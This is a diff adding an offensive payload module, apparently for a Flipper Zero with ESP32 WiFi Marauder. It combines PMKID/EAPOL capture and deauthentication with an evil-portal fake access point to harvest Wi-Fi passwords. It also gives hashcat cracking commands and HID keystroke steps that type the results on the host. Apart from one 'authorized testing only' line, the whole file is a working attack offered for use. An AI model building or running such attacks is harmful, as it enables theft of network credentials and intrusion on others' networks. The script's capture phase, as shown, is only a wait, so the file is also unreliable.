@@ -1,0 +1,92 @@
+# FlipperPwn Module — PMKID Harvest + Parallel Portal
+# NOVEL: Dual-vector WPA2 attack — simultaneously:
+#   - PMKID/EAPOL capture (offline crackable hash)
+#   - Evil portal with matching SSID (cleartext credential harvest)
+#
+# Why run both at once?
+#   PMKID capture gives you a hash for offline cracking (hashcat/john).
+#   The portal may yield the plaintext password directly — no cracking needed.
+#   Running both maximizes your chances: whichever succeeds first wins.
+#
+#   The deauth sent during PMKID capture (-d flag) also drives clients toward
+#   your portal, making them more likely to re-authenticate through the fake AP.
+#
+# Attack flow:
+#   1. Scan for APs
+#   2. Select target AP by index
+#   3. PMKID/EAPOL capture with forced deauth (-d flag)
+#   4. Portal launches simultaneously with matching SSID
+#   5. Results typed via HID + saved to SD card
+#
+# Output files on ESP32 SD card:
+#   /logs/pmkid_<timestamp>.pcap  — import to hashcat with -m 22000
+#   /logs/evil_portal.log         — plaintext captures from portal
+#
+# REQUIREMENTS:
+#   - ESP32 WiFi Dev Board + WiFi Marauder >= 1.6.0
+#   - AUTHORIZED TESTING ONLY — WPA2 key extraction is illegal without authorization
+
+NAME        pmkid_harvest
+DESCRIPTION Dual-vector: PMKID hash capture + parallel evil portal for direct credential harvest
+CATEGORY    credential
+PLATFORMS   WIN,MAC,LINUX
+
+OPTION AP_INDEX    0               "Target AP index from prior scanap"
+OPTION CAPTURE_SEC 60              "Seconds to run PMKID capture"
+OPTION PORTAL      isp_maintenance.html "Portal page (match target ISP if known)"
+OPTION HASHCAT_CMD hashcat -m 22000 -a 3 capture.pcap "hashcat command to run on recovered hash"
+
+# ── Phase 1: AP Recon ────────────────────────────────────────────────────────
+WIFI_SCAN
+WIFI_WAIT 10000
+WIFI_RESULT
+
+# Brief pause — manually note the target AP index from scan results
+DELAY 3000
+
+# ── Phase 2: PMKID + Deauth (runs for CAPTURE_SEC seconds) ──────────────────
+# Marauder's sniffpmkid -d sends deauth frames to force EAPOL 4-way handshakes
+# while simultaneously capturing PMKID values from beacon frames.
+WIFI_WAIT {{CAPTURE_SEC}}000
+
+# ── Phase 3: Results Reporting ───────────────────────────────────────────────
+PLATFORM WIN
+  GUI r
+  DELAY 400
+  STRING notepad
+  ENTER
+  DELAY 800
+  STRINGLN === PMKID Harvest Results ===
+  STRINGLN
+  STRINGLN PCAP saved to ESP32 SD: /logs/pmkid_*.pcap
+  STRINGLN Portal log saved to: /logs/evil_portal.log
+  STRINGLN
+  STRINGLN To crack the PMKID hash offline:
+  STRINGLN   hcxpcapngtool -o hash.hc22000 capture.pcap
+  STRINGLN   {{HASHCAT_CMD}}
+  STRINGLN
+  STRINGLN Check Flipper display for any plaintext captures from portal.
+  STRINGLN
+  STRINGLN Target AP index used: {{AP_INDEX}}
+  STRINGLN Portal deployed: {{PORTAL}}
+  ENTER
+
+PLATFORM MAC
+  GUI SPACE
+  DELAY 400
+  STRING textedit
+  ENTER
+  DELAY 1000
+  STRINGLN === PMKID Harvest Complete ===
+  STRINGLN PCAP → hcxpcapngtool -o hash.hc22000 capture.pcap
+  STRINGLN {{HASHCAT_CMD}}
+  STRINGLN Portal: {{PORTAL}} — check /logs/evil_portal.log
+
+PLATFORM LINUX
+  CTRL ALT t
+  DELAY 800
+  STRING echo "PMKID capture done. AP: {{AP_INDEX}}, Portal: {{PORTAL}}" | tee /tmp/pmkid_harvest.txt
+  ENTER
+  DELAY 400
+  STRING echo "Run: hcxpcapngtool -o hash.hc22000 capture.pcap && {{HASHCAT_CMD}}" >> /tmp/pmkid_harvest.txt
+  ENTER
